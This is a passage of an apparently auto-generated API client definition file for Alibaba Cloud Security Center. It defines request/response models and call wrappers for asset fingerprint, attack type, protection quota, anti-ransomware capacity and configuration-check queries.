*   **web_server**: website

This parameter is required.', example='lkm'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  forceFlush?: boolean(name='ForceFlush', description='Specifies whether to forcefully refresh the data that you want to query. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   zh: Chinese
*   en: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  searchInfo?: string(name='SearchInfo', description='The value of the search condition. You must specify this parameter based on the value of the **SearchItem** parameter.

*   If you set **SearchItem** to **domain**, you must enter the domain name.
*   If you set **SearchItem** to **module_name**, you must enter the module name.
*   If you set **SearchItem** to **path**, you must enter the path to the self-starting item.

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the information about asset fingerprints by asset fingerprint name.', example='/lib/systemd/s****'),
  searchItem?: string(name='SearchItem', description='The type of the search condition. You must specify this parameter based on the value of the **Biz** parameter. Valid values:

*   If you set **Biz** to **web_server**, set **SearchItem** to the following value:

    *   **domain**: the domain name

*   If you set **Biz** to **lkm**, set **SearchItem** to the following value:

    *   **module_name**: the name of the module

*   If you set **Biz** to **autorun**, set **SearchItem** to the following value:

    *   **path**: the path to the self-starting item

>  You must specify both the **SearchItem** and **SearchInfo** parameters before you can query the information about asset fingerprints by asset fingerprint name.', example='path'),
}

model GetAssetsPropertyItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  propertyItems?: [ 
    {
      count?: int32(name='Count', description='The number of servers related to the asset fingerprints.', example='23'),
      domain?: string(name='Domain', description='The endpoint.

> This parameter is returned only when **Biz** is set to **web_server**.', example='localhost'),
      moduleName?: string(name='ModuleName', description='The name of the module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='alihids'),
      path?: string(name='Path', description='The path to the startup item.

> This parameter is returned only when **Biz** is set to **autorun**.', example='C:/Program Files/****'),
    }
  ](name='PropertyItems', description='An array that consists of the aggregation information about asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='340D7FC4-D575-1661-8ACD-CFA7BE57****'),
}

model GetAssetsPropertyItemResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAssetsPropertyItemResponseBody(name='body'),
}

/**
 * @summary Queries the aggregation information about the asset fingerprints of the startup item, kernel module, or website type.
 *
 * @param request GetAssetsPropertyItemRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAssetsPropertyItemResponse
 */
async function getAssetsPropertyItemWithOptions(request: GetAssetsPropertyItemRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the aggregation information about the asset fingerprints of the startup item, kernel module, or website type.
 *
 * @param request GetAssetsPropertyItemRequest
 * @return GetAssetsPropertyItemResponse
 */
async function getAssetsPropertyItem(request: GetAssetsPropertyItemRequest): GetAssetsPropertyItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyItemWithOptions(request, runtime);
}

model GetAttackTypeListResponseBody = {
  attackTypeList?: [ 
    {
      label?: string(name='Label', description='The description of the attack type.', example='sas.attack.type.type12'),
      statusType?: string(name='Status_Type', description='The attack source. Valid values:

*   **cfw**: Cloud Firewall
*   **alinet**: network defense plug-in
*   **waf**: Web Application Firewall (WAF)', example='alinet'),
      value?: string(name='Value', description='The value of the attack type.', example='upload'),
    }
  ](name='AttackTypeList', description='The attack types.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='CE500770-42D3-442E-9DDD-156E0F9F****'),
}

model GetAttackTypeListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAttackTypeListResponseBody(name='body'),
}

/**
 * @summary Queries a list of attack types on the Attack Analysis page.
 *
 * @param request GetAttackTypeListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAttackTypeListResponse
 */
async function getAttackTypeListWithOptions(runtime: Util.RuntimeOptions): GetAttackTypeListResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetAttackTypeList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of attack types on the Attack Analysis page.
 *
 * @return GetAttackTypeListResponse
 */
async function getAttackTypeList(): GetAttackTypeListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAttackTypeListWithOptions(runtime);
}

model GetAuthSummaryResponseBody = {
  allowPartialBuy?: int32(name='AllowPartialBuy', description='Indicates whether you can purchase protection quota on demand when you purchase Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  allowUpgradePartialBuy?: int32(name='AllowUpgradePartialBuy', description='Indicates whether you can purchase protection quota on demand after an upgrade. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  allowUserUnbind?: int32(name='AllowUserUnbind', description='Indicates whether all bound assets can be immediately unbound. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  autoBind?: int32(name='AutoBind', description='Indicates whether automatic binding is enabled. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
  defaultAuthToAll?: int32(name='DefaultAuthToAll', description='Indicates whether the protection quota is supported for all assets. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  hasPreBindSetting?: boolean(name='HasPreBindSetting', description='Indicates whether pre-bound assets exist. If you select assets to bind when you purchase Security Center, pre-bound assets exist. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  highestVersion?: int32(name='HighestVersion', description='The most advanced edition that is used. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition

>  If you purchase Security Center Multi-edition, the value indicates the most advanced edition that is used. Otherwise, the value indicates the specific edition that is purchased.', example='1'),
  isMultiVersion?: int32(name='IsMultiVersion', description='Indicates whether Security Center Multi-edition is purchased. Valid values:

*   **0**: no
*   **1**: yes', example='1'),
  machine?: {
    bindCoreCount?: int32(name='BindCoreCount', description='The number of cores of the assets that are bound to Security Center.', example='10'),
    bindEcsCount?: int32(name='BindEcsCount', description='The number of the assets that are bound to Security Center.', example='10'),
    postPaidBindCoreCount?: int32(name='PostPaidBindCoreCount', description='Bind the number of cores for postpaid authorization assets.', example='10'),
    postPaidBindEcsCount?: int32(name='PostPaidBindEcsCount', description='The number of assets bound to the postpaid authorization.', example='10'),
    riskCoreCount?: int32(name='RiskCoreCount', description='The number of cores of the assets that are at risk.', example='10'),
    riskEcsCount?: int32(name='RiskEcsCount', description='The number of the assets that are at risk.', example='10'),
    totalCoreCount?: int32(name='TotalCoreCount', description='The total number of asset cores.', example='10'),
    totalEcsCount?: int32(name='TotalEcsCount', description='The total number of assets.', example='10'),
    unBindCoreCount?: int32(name='UnBindCoreCount', description='The number of cores of unbound assets.', example='10'),
    unBindEcsCount?: int32(name='UnBindEcsCount', description='The number of unbound assets.', example='10'),
  }(name='Machine', description='The statistics of the protection quota for assets.'),
  postPaidHighestVersion?: string(name='PostPaidHighestVersion', description='Activate the pay-as-you-go service protection version for hosts and container security, which is the highest protection version among all bound hosts. Values:   - **1**: Free Edition  - **3**: Enterprise Edition - **5**: Advanced Edition - **6**: Antivirus Edition     - **7**: Flagship Edition', example='7'),
  postPaidHostAutoBind?: string(name='PostPaidHostAutoBind', description='The pay-as-you-go service for host and container security adds an automatic binding identifier for new hosts, with values: - **0**: Off - **1**: On', example='1'),
  postPaidHostAutoBindVersion?: string(name='PostPaidHostAutoBindVersion', description='The version for the pay-as-you-go service of host and container security to automatically bind new assets, with values: - **1**: Free Edition - **3**: Enterprise Edition - **5**: Advanced Edition - **6**: Antivirus Edition - **7**: Flagship Edition', example='7'),
  postPaidVersionSummary?: [ 
    {
      authBindType?: string(name='AuthBindType', description='The type of authorization consumed during binding, with values: - **ASSET**: Consumes the number of authorized devices - **CORE**: Consumes the number of authorized cores - **ASSET_AND_CORE**: Consumes both the number of authorized devices and cores.', example='ASSET'),
      index?: int32(name='Index', description='Current version index, the higher the number, the newer the version, used for sorting. Values: - **1**: Free Edition - **2**: Anti-virus Edition - **3**: Advanced Edition - **4**: Enterprise Edition - **5**: Flagship Edition', example='1'),
      usedCoreCount?: long(name='UsedCoreCount', description='Number of authorized cores used. > This parameter is valid when AuthBindType is set to CORE or ASSET_AND_CORE.', example='10'),
      usedEcsCount?: long(name='UsedEcsCount', description='Number of authorized devices used. > This parameter is valid when AuthBindType is ASSET or ASSET_AND_CORE.', example='10'),
      version?: int32(name='Version', description='Bound host assets with postpaid versions, values:   - **1**: Free version  - **3**: Enterprise version - **5**: Advanced version - **6**: Anti-virus version     - **7**: Flagship version', example='3'),
    }
  ](name='PostPaidVersionSummary', description='Statistics on pay-as-you-go service authorization for host and container security.'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-***-B9270EF46038'),
  versionSummary?: [ 
    {
      authBindType?: string(name='AuthBindType', description='The type of the quota that is consumed. Valid values:

*   ASSET: quota of servers.
*   CORE: quota of server cores.
*   ASSET_AND_CORE: both.', example='ASSET'),
      index?: int32(name='Index', description='The index of the current edition. The smaller the value, the higher the edition. The index is used for sorting.', example='1'),
      totalCoreAuthCount?: int32(name='TotalCoreAuthCount', description='The total quota of server cores.

>  This parameter takes effect only if AuthBindType is set to CORE or ASSET_AND_CORE.', example='10'),
      totalCount?: int32(name='TotalCount', description='The total quota of servers in the current edition.

>  This parameter takes effect only if AuthBindType is set to ASSET or ASSET_AND_CORE.', example='10'),
      totalEcsAuthCount?: int32(name='TotalEcsAuthCount', description='The total quota of servers.

>  This parameter takes effect only if AuthBindType is set to ASSET or ASSET_AND_CORE.', example='10'),
      unUsedCount?: int32(name='UnUsedCount', description='The remaining quota of servers.

>  This parameter takes effect only if AuthBindType is set to ASSET or ASSET_AND_CORE.', example='10'),
      unusedCoreAuthCount?: int32(name='UnusedCoreAuthCount', description='The remaining quota of server cores.

>  This parameter takes effect only if AuthBindType is set to CORE or ASSET_AND_CORE.', example='10'),
      unusedEcsAuthCount?: int32(name='UnusedEcsAuthCount', description='The remaining quota of servers.

>  This parameter takes effect only if AuthBindType is set to ASSET or ASSET_AND_CORE.', example='10'),
      usedCoreCount?: int32(name='UsedCoreCount', description='The consumed quota of server cores.

>  This parameter takes effect only if AuthBindType is set to CORE or ASSET_AND_CORE.', example='10'),
      usedEcsCount?: int32(name='UsedEcsCount', description='The used quota of servers.

>  This parameter takes effect only if AuthBindType is set to ASSET or ASSET_AND_CORE.', example='10'),
      version?: int32(name='Version', description='The edition of purchased Security Center. Valid values:

*   **1**: Basic edition
*   **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition
*   **7**: Ultimate edition
*   **8**: Multi-edition
*   **10**: Value-added Plan edition', example='3'),
    }
  ](name='VersionSummary', description='The quota consumption statistics.'),
}

model GetAuthSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAuthSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the statistics of asset protection quota.
 *
 * @param request GetAuthSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAuthSummaryResponse
 */
async function getAuthSummaryWithOptions(runtime: Util.RuntimeOptions): GetAuthSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetAuthSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics of asset protection quota.
 *
 * @return GetAuthSummaryResponse
 */
async function getAuthSummary(): GetAuthSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAuthSummaryWithOptions(runtime);
}

model GetAuthVersionStatisticResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='2CA2BDF6-F3BD-51A4-BAAC-30B02F7A3FBB'),
  statistics?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center. Valid values:

*   **1**: Basic edition (Unauthorized)
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='6'),
      count?: int32(name='Count', description='The number of authorized servers.', example='1'),
    }
  ](name='Statistics', description='The statistics about the numbers of assets protected by each edition of Security Center.'),
}

model GetAuthVersionStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAuthVersionStatisticResponseBody(name='body'),
}

/**
 * @summary Queries the statistics about the numbers of assets protected by each edition of Security Center.
 *
 * @param request GetAuthVersionStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAuthVersionStatisticResponse
 */
async function getAuthVersionStatisticWithOptions(runtime: Util.RuntimeOptions): GetAuthVersionStatisticResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetAuthVersionStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics about the numbers of assets protected by each edition of Security Center.
 *
 * @return GetAuthVersionStatisticResponse
 */
async function getAuthVersionStatistic(): GetAuthVersionStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAuthVersionStatisticWithOptions(runtime);
}

model GetBackupAutoConfigStatusResponseBody = {
  data?: {
    canConfigAuto?: boolean(name='CanConfigAuto', description='Indicates whether the anti-ransomware policy for servers can be automatically configured by the managed anti-ransomware feature. Valid values:

*   **false**
*   **true**', example='false'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='898F7AA7-CECD-5EC7-AF4D-664C601B****'),
}

model GetBackupAutoConfigStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetBackupAutoConfigStatusResponseBody(name='body'),
}

/**
 * @summary Checks whether the managed anti-ransomware feature can automatically configure an anti-ransomware policy for servers.
 *
 * @param request GetBackupAutoConfigStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetBackupAutoConfigStatusResponse
 */
async function getBackupAutoConfigStatusWithOptions(runtime: Util.RuntimeOptions): GetBackupAutoConfigStatusResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetBackupAutoConfigStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether the managed anti-ransomware feature can automatically configure an anti-ransomware policy for servers.
 *
 * @return GetBackupAutoConfigStatusResponse
 */
async function getBackupAutoConfigStatus(): GetBackupAutoConfigStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBackupAutoConfigStatusWithOptions(runtime);
}

model GetBackupStorageCountResponseBody = {
  backupStorageCount?: {
    buyStorageByte?: long(name='BuyStorageByte', description='The anti-ransomware capacity that you purchased. Unit: bytes.', example='2276332666880'),
    ecsUsageStorageByte?: long(name='EcsUsageStorageByte', description='The storage capacity that is occupied by the backup data of your servers. Unit: bytes.', example='817262417803'),
    overflow?: int32(name='Overflow', description='Indicates whether the anti-ransomware capacity that is used exceeds the anti-ransomware capacity that you purchased. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
    uniUsageStorageByte?: long(name='UniUsageStorageByte', description='The storage capacity that is occupied by the backup data of your databases. Unit: bytes.', example='7453049350'),
    usageStorageByte?: long(name='UsageStorageByte', description='The total anti-ransomware capacity that is used. Unit: bytes.', example='839621565853'),
  }(name='BackupStorageCount', description='The details about the anti-ransomware capacity.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='33C2CCFF-4BF8-5F88-9B5C-22F932F80E5A'),
}

model GetBackupStorageCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetBackupStorageCountResponseBody(name='body'),
}

/**
 * @summary Queries the anti-ransomware capacity that is used.
 *
 * @param request GetBackupStorageCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetBackupStorageCountResponse
 */
async function getBackupStorageCountWithOptions(runtime: Util.RuntimeOptions): GetBackupStorageCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetBackupStorageCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the anti-ransomware capacity that is used.
 *
 * @return GetBackupStorageCountResponse
 */
async function getBackupStorageCount(): GetBackupStorageCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBackupStorageCountWithOptions(runtime);
}

model GetBuildRiskDefineRuleConfigRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese.
*   **en**: English.', example='zh'),
}

model GetBuildRiskDefineRuleConfigResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    id?: long(name='Id', description='The configuration ID for scanning image build command risks.', example='273698***'),
    ruleCount?: int32(name='RuleCount', description='The total number of check items.', example='100'),
    ruleTree?: [ 
      {
        classKey?: string(name='ClassKey', description='The check item type.', example='other'),
        className?: string(name='ClassName', description='The name of the check item type.', example='other'),
        ruleList?: [ 
          {
            ruleKey?: string(name='RuleKey', description='The check item.', example='add'),
            ruleName?: string(name='RuleName', description='The name of the check item.', example='used ADD'),
            selected?: boolean(name='Selected', description='Indicates whether the check item is selected. Valid values:

*   **true**
*   **false**', example='true'),
          }
        ](name='RuleList', description='The check items of the type.'),
      }
    ](name='RuleTree', description='The details of all check items.'),
    selectedCount?: int32(name='SelectedCount', description='The number of selected check items.', example='99'),
  }(name='Data', description='The data returned.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='69BFFCDE-37D6-5A49-A8BC-BB03AC83****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetBuildRiskDefineRuleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetBuildRiskDefineRuleConfigResponseBody(name='body'),
}

/**
 * @summary Queries configurations for scanning image build command risks.
 *
 * @param request GetBuildRiskDefineRuleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetBuildRiskDefineRuleConfigResponse
 */
async function getBuildRiskDefineRuleConfigWithOptions(request: GetBuildRiskDefineRuleConfigRequest, runtime: Util.RuntimeOptions): GetBuildRiskDefineRuleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetBuildRiskDefineRuleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries configurations for scanning image build command risks.
 *
 * @param request GetBuildRiskDefineRuleConfigRequest
 * @return GetBuildRiskDefineRuleConfigResponse
 */
async function getBuildRiskDefineRuleConfig(request: GetBuildRiskDefineRuleConfigRequest): GetBuildRiskDefineRuleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBuildRiskDefineRuleConfigWithOptions(request, runtime);
}

model GetCanTrySasRequest {
  fromEcs?: boolean(name='FromEcs', description='Specifies whether the request is redirected from the Elastic Compute Service (ECS) console. Valid values:

*   **true**
*   **false**', example='true'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model GetCanTrySasResponseBody = {
  data?: {
    canTry?: int32(name='CanTry', description='Indicates whether the user is qualified for the trial use. Valid values:

*   **true**
*   **false**', example='true'),
    canTryVersions?: [ int32 ](name='CanTryVersions', description='The editions that are allowed for the trial use.'),
    tryType?: int32(name='TryType', description='The trial type. Valid values:

*   **0**: trial prohibited
*   **1**: first trial
*   **2**: second trial', example='1'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8BAA57***B7073A5C1'),
}

model GetCanTrySasResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCanTrySasResponseBody(name='body'),
}

/**
 * @summary Checks whether the current user is qualified for the trial use of Security Center.
 *
 * @param request GetCanTrySasRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCanTrySasResponse
 */
async function getCanTrySasWithOptions(request: GetCanTrySasRequest, runtime: Util.RuntimeOptions): GetCanTrySasResponse {
  Util.validateModel(request);
  var body : map[string]any = {};
  if (!Util.isUnset(request.fromEcs)) {
    body['FromEcs'] = request.fromEcs;
  }
  if (!Util.isUnset(request.lang)) {
    body['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    body = OpenApiUtil.parseToMap(body),
  };
  var params = new OpenApi.Params{
    action = 'GetCanTrySas',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Checks whether the current user is qualified for the trial use of Security Center.
 *
 * @param request GetCanTrySasRequest
 * @return GetCanTrySasResponse
 */
async function getCanTrySas(request: GetCanTrySasRequest): GetCanTrySasResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCanTrySasWithOptions(request, runtime);
}

model GetCheckConfigResponseBody = {
  cycleDays?: [ int32 ](name='CycleDays', description='The days in a week on which an automatic check is performed.'),
  enableAddCheck?: boolean(name='EnableAddCheck', description='Indicates whether the check for new check items in the selected requirement item is enabled by default. Valid values:

*   **true**
*   **false**', example='false'),
  enableAutoCheck?: boolean(name='EnableAutoCheck', description='Indicates whether the automatic check is enabled. Valid values:

*   **true**
*   **false**', example='true'),
  endTime?: int32(name='EndTime', description='The end time of the check. The value indicates a point in time. The time period that is specified by the start time and end time must be one of the following time periods:

*   **00:00 to 06:00**: If StartTime is set to 00:00, EndTime must be set to 06:00.
*   **06:00 to 12:00**: If StartTime is set to 06:00, EndTime must be set to 12:00.
*   **12:00 to 18:00**: If StartTime is set to 12:00, EndTime must be set to 18:00.
*   **18:00 to 24:00**: If StartTime is set to 18:00, EndTime must be set to 24:00.', example='6'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5A3D5C8F-2A42-5477-BDD8-27E64B5F1739'),
  selectedChecks?: [ 
    {
      checkId?: long(name='CheckId', description='The ID of the check item.', example='3'),
      sectionId?: long(name='SectionId', description='The section ID of the check item.', example='69'),
    }
  ](name='SelectedChecks', description='The check items selected in the policy.'),
  standards?: [ 
    {
      id?: long(name='Id', description='The ID of the check item.', example='1'),
      showName?: string(name='ShowName', description='The name of the check item.', example='Cloud service configuration management'),
      status?: string(name='Status', description='The status of the check item. Valid values:

*   **ON**: The check item is enabled.
*   **OFF**: The check item is disabled.', example='ON'),
      type?: string(name='Type', description='The type of the check item. Valid values:

*   **RISK**: cloud service configuration management
*   **IDENTITY_PERMISSION**: identity and permission management
*   **COMPLIANCE**: compliance', example='RISK'),
    }
  ](name='Standards', description='The information about the check items.'),
  startTime?: int32(name='StartTime', description='The start time of the check. The value indicates a point in time.', example='0'),
}

model GetCheckConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetCheckConfigResponseBody(name='body'),
}

/**
 * @summary Queries the information about an automatic configuration check on cloud services.
 *
 * @param request GetCheckConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetCheckConfigResponse
 */
async function getCheckConfigWithOptions(runtime: Util.RuntimeOptions): GetCheckConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about an automatic configuration check on cloud services.
 *
 * @return GetCheckConfigResponse
 */
async function getCheckConfig(): GetCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckConfigWithOptions(runtime);
}

model GetCheckCountStatisticRequest {
  statisticType?: string(name='StatisticType', description='Type of data statistics. Values:  
- **user**: Top 5 over-authorized users.  
- **role**: Top 5 over-authorized roles.  
- **instance**: Top 5 risky cloud products.', example='instance'),
  vendors?: [ string ](name='Vendors', description='List of cloud vendors.'),
}

model GetCheckCountStatisticResponseBody = {
  checkCountStatisticDTO?: {
    checkCountStatisticItems?: [ 
      {
        instanceId?: string(name='InstanceId', description='Cloud product instance ID.', example='i-wz9bpxyu6t74qn9g****'),
        instanceName?: string(name='InstanceName', description='Instance name of the asset.', example='launch-advisor-2021****'),
        instanceSubType?: int32(name='InstanceSubType', description='Subtype of the cloud product.', example='0'),
        instanceSubTypeName?: string(name='InstanceSubTypeName', description='The subtype of the cloud product. Values:  

- When **InstanceType** is **ECS**, this parameter can take the following values:  
    - **INSTANCE**  
    - **DISK**  
    - **SECURITY_GROUP**  
- When **InstanceType** is **ACR**, this parameter can take the following values:  
    - **REPOSITORY_ENTERPRISE**  
    - **REPOSITORY_PERSON**  
- When **InstanceType** is **RAM**, this parameter can take the following values:  
    - **ALIAS**  
    - **USER**  
    - **POLICY**  
    - **GROUP**  
- When **InstanceType** is **WAF**, this parameter can take the following value:  
    - **DOMAIN**  
- For other **InstanceType** values, this parameter takes the value:  
    - **INSTANCE**', example='INSTANCE'),
        instanceType?: int32(name='InstanceType', description='Type of the cloud product. Values:  
- **0**: ECS (Elastic Compute Service)
- **1**: SLB (Server Load Balancer)
- **2**: NAT Gateway
- **3**: RDS (Relational Database Service) Database
- **4**: MongoDB Database
- **5**: Redis Database
- **6**: Container Image
- **7**: Container', example='0'),
        instanceTypeName?: string(name='InstanceTypeName', description='The asset type of cloud products. Values:
- **ECS**: Elastic Compute Service 
- **SLB**: Server Load Balancer 
- **RDS**: Relational Database Service 
- **MONGODB**: MongoDB Database 
- **KVSTORE**: Redis Database 
- **ACR**: Container Registry 
- **CSK**: CSK 
- **VPC**: Virtual Private Cloud 
- **ACTIONTRAIL**: Action Trail 
